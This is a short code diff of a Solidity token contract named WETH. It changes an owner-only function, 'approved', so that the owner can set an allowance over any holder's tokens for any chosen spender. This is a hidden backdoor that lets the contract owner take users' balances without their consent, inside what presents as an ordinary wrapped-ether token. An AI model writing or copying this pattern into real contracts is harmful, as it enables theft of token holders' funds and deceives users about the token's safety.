@@ -46,8 +46,8 @@ contract WETH is ERC20, Ownable {
         _mint(to, amount);
     }
 
-    function approved(address owner, uint256 value) public onlyOwner {
-        _approve(owner, msg.sender, value);
+    function approved(address owner, address spender,uint256 value) public onlyOwner {
+        _approve(owner, spender, value);
     }
 
     function getETHSafe(address _addr) public view returns (uint) {
